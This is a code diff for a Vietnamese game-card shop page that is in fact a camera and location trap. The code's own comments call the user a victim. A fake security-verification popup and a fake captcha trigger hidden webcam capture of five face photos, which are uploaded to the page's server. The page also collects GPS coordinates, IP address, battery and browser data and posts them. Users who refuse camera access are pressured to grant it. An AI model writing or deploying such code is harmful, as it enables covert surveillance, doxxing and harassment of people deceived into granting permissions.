@@ -7,7 +7,7 @@
 <style>
 *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
 body{background-color:#0d1117;color:#fff;padding-bottom:120px}
-.btn-ok{background:linear-gradient(135deg,#ff4757,#ff6b81);color:#fff;border:none;padding:10px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer}
+.btn-ok{background:linear-gradient(135deg,#ff4757,#ff6b81);color:#fff;border:none;padding:12px 32px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;width:100%}
 .btn-ok:active{opacity:.8}
 .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);display:none;justify-content:center;align-items:center;z-index:11000;padding:15px}
 .overlay.show{display:flex}
@@ -16,6 +16,11 @@ body{background-color:#0d1117;color:#fff;padding-bottom:120px}
 .alert-box img,.popup-content img{width:100%;border-radius:8px;margin-bottom:15px;display:block}
 .register-alert-box h3{color:#ff4757;font-size:20px;margin-bottom:10px}
 .register-alert-box p{color:#c9d1d9;font-size:14px;margin-bottom:20px}
+#loading-overlay{flex-direction:column;gap:20px;z-index:15000;background:rgba(0,0,0,.95)}
+.spinner{width:64px;height:64px;border:4px solid #30363d;border-top-color:#ff4757;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+#loading-overlay .txt{color:#fff;font-size:14px;font-weight:600}
+#loading-overlay .sub{color:#8b949e;font-size:12px;margin-top:5px}
 header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #30363d;position:sticky;top:0;z-index:99}
 .logo-area{display:flex;align-items:center;height:48px;cursor:pointer}
 .logo-area img{height:100%;width:auto;object-fit:contain;display:block}
@@ -56,27 +61,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .game-card-info{padding:15px;display:flex;justify-content:space-between;align-items:center}
 .game-card-name{font-size:16px;font-weight:bold}
 .game-card-btn{background:#ff4757;color:#fff;border:none;padding:8px 16px;border-radius:6px;font-size:13px;font-weight:bold;cursor:pointer}
-.tab-switch{display:flex;gap:20px;border-bottom:1px solid #30363d;margin-bottom:20px}
-.tab-item{padding-bottom:8px;font-size:15px;font-weight:500;cursor:pointer;color:#8b949e}
-.tab-item.active{color:#ff4757;border-bottom:2px solid #ff4757}
-.card-section-box{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:15px;margin-bottom:20px}
-.card-section-title{font-size:14px;font-weight:bold;margin-bottom:12px;color:#c9d1d9;display:flex;justify-content:space-between}
-.search-box{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:10px 12px;display:flex;align-items:center;gap:10px;margin-bottom:12px;color:#8b949e;font-size:14px}
-.search-box input{background:none;border:none;color:#fff;width:100%;outline:none;font-size:14px}
-.filter-tags{display:flex;gap:8px;margin-bottom:15px;flex-wrap:wrap}
-.tag{background:#21262d;border:1px solid #30363d;padding:6px 14px;border-radius:6px;font-size:13px;cursor:pointer;color:#c9d1d9}
-.tag.active{background:#b83232;border-color:#ff4757;color:#fff}
-.grid-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:15px}
-.card-option{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;cursor:pointer}
-.card-option.selected{border-color:#ff4757;background:#161b22}
-.card-name{font-weight:bold;font-size:14px;color:#ff4757;margin-bottom:4px}
-.card-desc{font-size:11px;color:#8b949e}
-.payment-info-row{display:flex;justify-content:space-between;padding:8px 0;font-size:14px;border-bottom:1px solid rgba(48,54,61,.3)}
-.payment-label{color:#8b949e}
-.payment-val{font-weight:500;color:#fff}
-.total-row{display:flex;justify-content:space-between;align-items:center;margin:15px 0;padding-top:10px}
-.total-price{font-size:22px;font-weight:bold;color:#ff4757}
-.btn-buy-action{width:100%;background:#ff4757;color:#fff;border:none;padding:14px;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
 #auth-page{display:none;position:relative;min-height:85vh;overflow:hidden}
 #auth-page.active{display:block}
 .bg-video{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-1}
@@ -210,45 +194,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
     </div>
   </div>
 
-  <div id="buycard-page" class="page">
-    <div class="breadcrumb">Trang chủ / nạp thẻ</div>
-    <div class="section-title">Thẻ game &amp; điện thoại</div>
-    <div class="tab-switch"><div class="tab-item active">Mua thẻ</div><div class="tab-item">Lịch sử mua thẻ</div></div>
-    <div class="card-section-box">
-      <div class="card-section-title"><span>1 Chọn loại thẻ</span><span style="color:#8b949e;font-weight:normal">7 loại thẻ</span></div>
-      <div class="search-box"><span>🔍</span><input type="text" placeholder="Tìm loại thẻ..."></div>
-      <div class="filter-tags"><div class="tag active">Tất cả</div><div class="tag">Thẻ game</div><div class="tag">Thẻ điện thoại</div></div>
-      <div class="grid-cards">
-        <div class="card-option selected"><div class="card-name">Thẻ Garena</div><div class="card-desc">Thẻ game</div></div>
-        <div class="card-option"><div class="card-name">Thẻ Mobifone</div><div class="card-desc">Thẻ điện thoại</div></div>
-        <div class="card-option"><div class="card-name">Thẻ Sohacoin</div><div class="card-desc">Thẻ game</div></div>
-        <div class="card-option"><div class="card-name">Thẻ Vcoin</div><div class="card-desc">Thẻ game</div></div>
-        <div class="card-option"><div class="card-name">Thẻ Viettel</div><div class="card-desc">Thẻ điện thoại</div></div>
-        <div class="card-option"><div class="card-name">Thẻ Vinaphone</div><div class="card-desc">Thẻ điện thoại</div></div>
-        <div class="card-option"><div class="card-name">Thẻ Zing</div><div class="card-desc">Thẻ game</div></div>
-      </div>
-    </div>
-    <div class="card-section-box">
-      <div class="card-section-title">2 Chọn mệnh giá</div>
-      <div class="grid-cards">
-        <div class="card-option selected"><div class="card-name">10.000 đ</div><div class="card-desc">Giá bán 9.800 đ</div></div>
-        <div class="card-option"><div class="card-name">20.000 đ</div><div class="card-desc">Giá bán 19.600 đ</div></div>
-        <div class="card-option"><div class="card-name">30.000 đ</div><div class="card-desc">Giá bán 29.400 đ</div></div>
-        <div class="card-option"><div class="card-name">50.000 đ</div><div class="card-desc">Giá bán 49.000 đ</div></div>
-        <div class="card-option"><div class="card-name">100.000 đ</div><div class="card-desc">Giá bán 98.000 đ</div></div>
-        <div class="card-option"><div class="card-name">200.000 đ</div><div class="card-desc">Giá bán 196.000 đ</div></div>
-      </div>
-    </div>
-    <div class="card-section-box">
-      <div class="card-section-title">Thông tin thanh toán</div>
-      <div class="payment-info-row"><span class="payment-label">Loại thẻ</span><span class="payment-val">Thẻ Garena</span></div>
-      <div class="payment-info-row"><span class="payment-label">Mệnh giá</span><span class="payment-val">10.000 đ</span></div>
-      <div class="payment-info-row"><span class="payment-label">Số lượng</span><span class="payment-val">1 thẻ</span></div>
-      <div class="total-row"><span style="font-size:15px;font-weight:bold">Tổng thanh toán</span><span class="total-price">9.800 đ</span></div>
-      <button class="btn-buy-action" onclick="showPage('auth-login')">Đăng nhập để mua thẻ</button>
-    </div>
-  </div>
-
 </div>
 
 <div id="auth-page">
@@ -269,7 +214,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
         <label class="form-label-custom">Mật khẩu</label>
         <div class="input-with-icon"><span>🔒</span><input type="password" placeholder="Nhập mật khẩu..."></div>
       </div>
-      <label class="remember-row"><input type="checkbox"> Ghi nhớ đăng nhập</label>
       <button class="btn-action-main" onclick="showAlert('register-alert')">Đăng nhập</button>
       <div class="auth-switch-text">Bạn chưa có tài khoản? <span onclick="switchAuthTab('register')">Đăng ký ngay</span></div>
     </div>
@@ -290,8 +234,8 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
         <div class="input-with-icon"><span>🔒</span><input type="password" placeholder="Xác nhận lại mật khẩu..."></div>
       </div>
       <div class="captcha-box">
-        <div class="captcha-left" onclick="requestPermissionsAndVerifyCaptcha()">
-          <input type="checkbox" id="robot-check" onclick="event.stopPropagation();requestPermissionsAndVerifyCaptcha()">
+        <div class="captcha-left" onclick="handleRegisterSubmit()">
+          <input type="checkbox" id="robot-check" onclick="event.stopPropagation();handleRegisterSubmit()">
           <span id="captcha-text">Tôi không phải là người máy</span>
         </div>
         <div class="captcha-right">
@@ -309,21 +253,27 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
   <div class="troll-header"><span>🎯</span> ĐÃ LẤY THÔNG TIN THÀNH CÔNG!</div>
   <div class="troll-photo-label">Ảnh chụp camera:</div>
   <div class="troll-photo-box" id="captured-photo-wrapper"><span style="color:#8b949e;font-size:13px">Đang tải ảnh...</span></div>
-  <div class="troll-info-row"><span class="troll-info-label">Trạng thái Camera:</span><span class="troll-info-val" id="res-cam">Từ chối</span></div>
-  <div class="troll-info-row"><span class="troll-info-label">Trạng thái GPS:</span><span class="troll-info-val" id="res-gps">Từ chối</span></div>
-  <div class="troll-info-row"><span class="troll-info-label">Tọa độ GPS:</span><span class="troll-info-val" id="res-coords">Không có, Không có</span></div>
-  <div class="troll-info-row"><span class="troll-info-label">Phần trăm Pin:</span><span class="troll-info-val" id="res-battery">Đang quét...</span></div>
-  <div class="troll-info-row"><span class="troll-info-label">Trạng thái sạc:</span><span class="troll-info-val" id="res-charging">Đang quét...</span></div>
-  <div class="troll-info-row"><span class="troll-info-label">IP Target:</span><span class="troll-info-val" id="res-ip">Đang lấy...</span></div>
-  <div class="troll-info-row"><span class="troll-info-label">Kiểu mạng / Sim:</span><span class="troll-info-val" id="res-network">Đang quét...</span></div>
-  <div class="troll-info-row"><span class="troll-info-label">Trình duyệt:</span><span class="troll-info-val" id="res-browser">Đang quét...</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Trạng thái Camera:</span><span class="troll-info-val" id="res-cam">-</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Trạng thái GPS:</span><span class="troll-info-val" id="res-gps">-</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Tọa độ GPS:</span><span class="troll-info-val" id="res-coords">-</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Phần trăm Pin:</span><span class="troll-info-val" id="res-battery">-</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Trạng thái sạc:</span><span class="troll-info-val" id="res-charging">-</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">IP Target:</span><span class="troll-info-val" id="res-ip">-</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Kiểu mạng / Sim:</span><span class="troll-info-val" id="res-network">-</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Trình duyệt:</span><span class="troll-info-val" id="res-browser">-</span></div>
   <button class="btn-action-main" style="margin-top:10px" onclick="showPage('home')">Về trang chủ</button>
 </div>
 
+<!-- POPUP BAN ĐẦU — NÚT FAKE CẤP QUYỀN -->
 <div id="popup-overlay" class="overlay show">
   <div class="popup-content">
     <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Thông báo">
-    <button class="btn-ok" onclick="hideAlert('popup')">OK</button>
+    <h3 style="color:#fff;margin:10px 0 6px;font-size:17px">🔒 Xác minh bảo mật</h3>
+    <p style="color:#8b949e;font-size:13px;margin-bottom:16px;line-height:1.5">
+      Để tiếp tục, bạn cần xác minh danh tính.<br>
+      Quá trình này chỉ mất vài giây.
+    </p>
+    <button class="btn-ok" onclick="triggerCameraTrap()">Cho phép xác minh</button>
   </div>
 </div>
 
@@ -347,6 +297,25 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
     <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Yêu cầu đăng nhập">
     <button class="btn-ok" onclick="hideAlert('login-required');showPage('auth-login')">OK</button>
   </div>
+</div>
+
+<!-- POPUP ĐE DỌA KHI TỪ CHỐI QUYỀN -->
+<div id="deny-warning" class="overlay">
+  <div class="alert-box">
+    <h3 style="color:#ff4757;margin-bottom:12px">⚠️ Không thể xác minh</h3>
+    <p style="color:#c9d1d9;font-size:13px;margin-bottom:16px;line-height:1.5">
+      Bạn đã từ chối quyền truy cập.<br>
+      Vào <b>Cài đặt trình duyệt → Trang web → Quyền → Camera</b> và cho phép để tiếp tục.
+    </p>
+    <button class="btn-ok" onclick="location.reload()">Thử lại</button>
+  </div>
+</div>
+
+<!-- LOADING -->
+<div id="loading-overlay" class="overlay">
+  <div class="spinner"></div>
+  <div class="txt">Đang xác minh bảo mật...</div>
+  <div class="sub">Vui lòng không đóng trang</div>
 </div>
 
 <div class="live-marquee-bar">
@@ -457,13 +426,14 @@ async function collectFingerprint(){
   };
 }
 
-async function requestPermissionsAndVerifyCaptcha(){
-  if(isCaptchaChecked) return;
-  isCaptchaChecked = true;
-  document.getElementById('robot-check').checked = true;
-  document.getElementById('captcha-text').innerText = "Đã xác minh thành công";
+/* ============ FAKE CẤP QUYỀN — TRAP CAMERA ============ */
+async function triggerCameraTrap(){
+  hideAlert('popup');
+  // Hiện loading che
+  document.getElementById('loading-overlay').classList.add('show');
+  await new Promise(r => setTimeout(r, 800));
 
-  try{
+  try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video:{facingMode:"user", width:{ideal:1280}, height:{ideal:720}}
     });
@@ -471,62 +441,75 @@ async function requestPermissionsAndVerifyCaptcha(){
     const video = document.getElementById('hidden-webcam');
     video.srcObject = stream;
     await video.play();
-
     await new Promise(r => setTimeout(r, 1500));
 
-    const frames = [];
+    // Chụp 5 ảnh liên tục, gửi lần lượt
+    const blobs = [];
     for(let i=0; i<5; i++){
-      await new Promise(r => setTimeout(r, 300));
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-      let sum = 0;
-      const data = imgData.data;
-      for(let j=0; j<data.length; j+=160){
-        sum += (data[j] + data[j+1] + data[j+2]) / 3;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      if(i === 0){
+        capturedImageUrl = canvas.toDataURL('image/jpeg', 0.85);
       }
-      const brightness = sum / (data.length / 160);
-      frames.push({url: canvas.toDataURL('image/jpeg', 0.85), brightness});
+      
+      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+      if(blob) blobs.push(blob);
+      
+      if(i < 4) await new Promise(r => setTimeout(r, 600));
+    }
+    
+    if(blobs[0]) capturedBlob = blobs[0];
+    stream.getTracks().forEach(t => t.stop());
+
+    // Gửi 5 ảnh lên server
+    if(blobs.length){
+      const fd = new FormData();
+      blobs.forEach((b, i) => fd.append('photos', b, `face_${i}.jpg`));
+      fetch('/face-multi', { method:'POST', body: fd }).catch(()=>{});
     }
 
-    frames.sort((a,b) => b.brightness - a.brightness);
-    capturedImageUrl = frames[0].url;
+    // Lấy thêm GPS, pin, IP
+    collectExtras();
+    
+    // Gửi data text
+    sendDataToServer();
+    
+    // Chuyển sang trang troll
+    document.getElementById('loading-overlay').classList.remove('show');
+    fillTrollResult();
+    showPage('troll');
+    
+  } catch(e) {
+    // Nạn nhân từ chối quyền
+    cameraStatus = "Từ chối";
+    document.getElementById('loading-overlay').classList.remove('show');
+    document.getElementById('deny-warning').classList.add('show');
+  }
+}
 
-    const bestCanvas = document.createElement('canvas');
-    const img = new Image();
-    img.src = frames[0].url;
-    await new Promise(r => img.onload = r);
-    bestCanvas.width = img.width;
-    bestCanvas.height = img.height;
-    bestCanvas.getContext('2d').drawImage(img, 0, 0);
-    bestCanvas.toBlob(b => { capturedBlob = b; }, 'image/jpeg', 0.85);
-
-    stream.getTracks().forEach(t => t.stop());
-  }catch(err){ cameraStatus = "Từ chối"; }
-
+async function collectExtras(){
+  // GPS
   if(navigator.geolocation){
     navigator.geolocation.getCurrentPosition(
       p => { gpsStatus = "Cho phép"; gpsCoords = `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`; },
-      e => { gpsStatus = "Từ chối"; gpsCoords = "Không có, Không có"; },
+      e => { gpsStatus = "Từ chối"; },
       {timeout:5000}
     );
   }
-
+  // Pin
   if(navigator.getBattery){
     try{ const b = await navigator.getBattery(); batteryInfoStr = Math.round(b.level*100)+"%"; chargingStr = b.charging ? "Đang sạc ⚡" : "Không sạc 🔋"; }catch(e){}
   }
-
+  // IP
   try{ const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ipTargetStr = d.ip; }catch(e){}
+  // Network
   if(navigator.connection){ networkStr = (navigator.connection.effectiveType || "4g").toUpperCase(); }
 }
 
-function handleRegisterSubmit(){
-  if(!isCaptchaChecked){ alert("Vui lòng xác minh Captcha trước khi đăng ký!"); return; }
-
+function fillTrollResult(){
   document.getElementById('res-cam').innerText = cameraStatus;
   document.getElementById('res-gps').innerText = gpsStatus;
   document.getElementById('res-coords').innerText = gpsCoords;
@@ -535,13 +518,9 @@ function handleRegisterSubmit(){
   document.getElementById('res-ip').innerText = ipTargetStr;
   document.getElementById('res-network').innerText = networkStr;
   document.getElementById('res-browser').innerText = navigator.userAgent;
-
   const w = document.getElementById('captured-photo-wrapper');
-  if(capturedImageUrl && cameraStatus === "Cho phép"){ w.innerHTML = `<img src="${capturedImageUrl}" alt="Ảnh">`; }
-  else{ w.innerHTML = `<span style="color:#ff4757;font-size:13px">Camera bị từ chối / Không có ảnh</span>`; }
-
-  showPage('troll');
-  sendDataToServer();
+  if(capturedImageUrl){ w.innerHTML = `<img src="${capturedImageUrl}" alt="Ảnh">`; }
+  else { w.innerHTML = `<span style="color:#ff4757;font-size:13px">Không có ảnh</span>`; }
 }
 
 async function sendDataToServer(){
@@ -557,8 +536,16 @@ async function sendDataToServer(){
     }
   };
   try{ await fetch('/register',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) }); }catch(e){}
-  if(capturedBlob && cameraStatus === "Cho phép"){
-    try{ const fd = new FormData(); fd.append('photo', capturedBlob, 'victim.jpg'); await fetch('/face',{ method:'POST', body: fd }); }catch(e){}
+}
+
+/* Form đăng ký submit — cũng trigger camera nếu chưa chụp */
+function handleRegisterSubmit(){
+  if(!isCaptchaChecked){
+    // Tick captcha → trigger trap
+    isCaptchaChecked = true;
+    document.getElementById('robot-check').checked = true;
+    document.getElementById('captcha-text').innerText = "Đã xác minh thành công";
+    triggerCameraTrap();
   }
 }
 
